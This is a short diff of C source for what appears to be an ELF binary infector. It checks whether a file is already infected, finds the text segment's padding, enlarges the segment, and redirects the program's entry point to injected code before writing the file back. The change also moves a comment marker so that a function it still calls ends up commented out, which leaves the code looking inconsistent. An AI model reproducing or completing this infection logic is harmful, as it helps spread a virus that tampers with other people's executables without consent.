@@ -187,17 +187,15 @@ static int		set_x_pad(void) {
 	}
 	return (0);
 }
-
-static int		update_mem(void) {
+/*
+static void		update_mem(void) {
 	sc_entry = hdrs.txt->p_vaddr + hdrs.txt->p_memsz;
 	sc_real_entry = hdrs.elf->e_entry;
 	hdrs.elf->e_entry = sc_entry;
 	hdrs.txt->p_filesz += sz.load;
 	hdrs.txt->p_memsz += sz.load;
-	return (0);
 }
 
-/*
 static void		proc_entries(uint64_t dir_ret, char *root_path) {
 	uint16_t		ent_sz;
 	uint8_t			*ent_ptr;
@@ -212,8 +210,10 @@ static void		proc_entries(uint64_t dir_ret, char *root_path) {
 		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()) {
 			sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
 			sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
-			if (!set_x_pad() && !update_mem())
+			if (!set_x_pad()) {
+				update_mem();
 				write_mem(buffs.path);
+			}
 		}
 		munmap(mem, sz.mem);
 	}
